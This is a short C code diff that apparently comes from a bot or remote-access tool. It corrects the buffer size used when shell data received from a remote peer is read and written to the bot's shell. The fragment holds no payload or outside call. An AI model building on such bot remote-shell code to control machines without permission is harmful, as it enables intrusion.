@@ -134,8 +134,8 @@ void laikaB_handleShellData(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uD
         LAIKA_ERROR("LAIKAPKT_SHELL_DATA requested on unopened shell!\n");
 
     /* read data buf */
-    laikaS_read(&peer->sock, buf, sz - 1);
+    laikaS_read(&peer->sock, buf, sz);
 
     /* write to shell */
-    laikaB_writeShell(bot, shell, buf, sz - 1);
+    laikaB_writeShell(bot, shell, buf, sz);
 }
